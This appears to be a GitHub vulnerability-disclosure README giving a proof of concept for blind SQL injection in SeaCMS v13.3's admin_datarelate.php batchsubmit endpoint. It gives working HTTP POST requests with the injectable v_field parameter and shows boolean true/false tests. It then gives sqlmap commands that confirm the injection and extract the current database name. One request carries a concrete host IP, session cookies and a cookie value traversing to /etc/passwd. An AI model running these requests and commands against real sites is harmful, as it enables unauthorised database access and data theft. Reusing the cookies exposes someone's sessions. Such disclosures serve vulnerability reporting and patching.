# seacms-v13.3-blind-based-sqli
Proof of Concept for SQL Injection vulnerability in SeaCMS v13.3
Impact system：<SeaCMS v13.3
Vulnerability URL：http://xxx.xxx.xx/30h9r/admin_datarelate.php?action=batchsubmit
Note: The /30h9r/ in /30h9r/admin_datarelate.php is randomly generated. The /30h9r/ for each cms is randomly generated
Vulnerability poc：

------------------------------------------------------------------------------------------------------------------------------------
POST /30h9r/admin_datarelate.php?action=batchsubmit HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 100
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: 
Origin: 
Referer: 
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

v_field=10&v_str1=1&v_str2=1
------------------------------------------------------------------------------------------------------------------------------------
Vulnerability reproduction:

Visit the ocean CMS website: https://www.seacms.net/; As shown in the picture：

<img width="832" height="538" alt="image" src="https://github.com/user-attachments/assets/7752ef93-0469-4846-b280-6ecdacffab08" />

<img width="832" height="514" alt="image" src="https://github.com/user-attachments/assets/33aefc47-2e75-4ba3-b13a-1f7712cb511a" />

Download the latest installation package version V13.3; And perform decompression; As shown in the picture

<img width="296" height="141" alt="image" src="https://github.com/user-attachments/assets/a2ce45f2-337a-496a-9b6e-046a9f527cde" />

Install according to the official user manual

The environment I installed this time:

Ubuntu 22, CPU: 2 cores, Memory: 4GB, Baota Panel -v9.6.0, MySQL 5.7.43, Apache 2.4.62, PHP 5.6.40

After installing the system, go to the default background. As shown in the picture

When the condition 6796=6796 is true; The data was successfully queried

<img width="2020" height="1366" alt="image" src="https://github.com/user-attachments/assets/28ddf9c9-0311-4414-92fe-d0d43b6ea1e5" />

When the condition 6796=6795 is false; The query data is empty

<img width="1998" height="1348" alt="image" src="https://github.com/user-attachments/assets/e87f3fd0-768c-4bee-87bf-0b33be377417" />

Copy the request packet; Change the injection point parameter 'v_field' to 'v_field==1' and save it as sql.txt; As follows:
-----------------------------------------------------------------------------------------------------------------------------------

POST /30h9r/admin_datarelate.php?action=batchsubmit HTTP/1.1
Host: 117.72.99.125
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 100
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: b90f5dd6d9e2dd57d6923cc5ff004f81_ssl=4367f410-636e-4b97-9883-f34bf361fa12.6Qw9eztOxIrDDuk37dBvDYqdw4M; a92363a1749cf97619f515a0efc163a5_ssl=f92a0fb9-7632-4731-bd2e-fb39cbfe492b.djCZJ5AYTm8WZzwMZyszKsi86S0; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MTA6InBocCB8IHBocD8iO3M6MzoiYWxsIjtpOjA7czozOiJodGEiO2k6MTt9; XLA_CI=8084cfdc4be60dd551c26fe7666cb493; history=%5B%7B%22name%22%3A%22kaill%22%2C%22pic%22%3A%22%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%22%2C%22link%22%3A%22%2Fdetail%2F%3F524.html%22%2C%22part%22%3A%22%22%7D%5D; PHPSESSID=67b60hjkikku0l5hc5s97dq6a6
Origin: http://117.72.99.125
Referer: http://117.72.99.125/30h9r/admin_datarelate.php?action=batch
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

v_field=1&v_str1=1&v_str2=1
-----------------------------------------------------------------------------------------------------------------------------------

Use sqlmap for injection verification

The existence of sql injection was successfully verified using the injection statement "sqlmap -r "sql.txt" -p v_field --dbms=mysql --level=5 --risk=3 --random-agent --flush-session --batch -v 3 ". As shown in the picture

<img width="1011" height="532" alt="截屏2025-09-07 22 58 38" src="https://github.com/user-attachments/assets/85d4c1fa-8621-482e-9921-62d565868f57" />

The statement "sqlmap -r sql.txt -p v_field --dbms=mysql --technique=T --current-db --batch -v 3 "was used to inject and obtain the database, successfully generating the database name. As shown in the picture

<img width="1010" height="513" alt="截屏2025-09-07 22 59 43" src="https://github.com/user-attachments/assets/a14e241f-bb83-4b6d-8bbe-72ea51a2e11a" />
